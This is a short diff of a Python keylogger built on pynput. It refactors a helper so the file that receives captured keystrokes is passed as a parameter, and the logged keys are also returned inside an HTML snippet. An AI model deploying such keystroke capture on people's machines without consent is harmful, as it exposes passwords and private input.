@@ -5,8 +5,8 @@ import time
 import threading
 from pynput.keyboard import Listener
 
-def write_to_file(value):
-    with open('variable.txt', 'w', encoding='utf-8') as file:
+def write_to_file(value, fileName):
+    with open(fileName, 'w', encoding='utf-8') as file:
         file.write(value)
 
 
@@ -34,7 +34,7 @@ def key_logger(timeRec):
         listener.stop()
 
     if key_string != "":        
-        write_to_file(key_string)
+        write_to_file(key_string, "variable.txt")
         print("key_string in key_logger.py: ", key_string)
         return "<div class='mb-2'><b>Key logger:</b> " + key_string + "</div>"
     else:
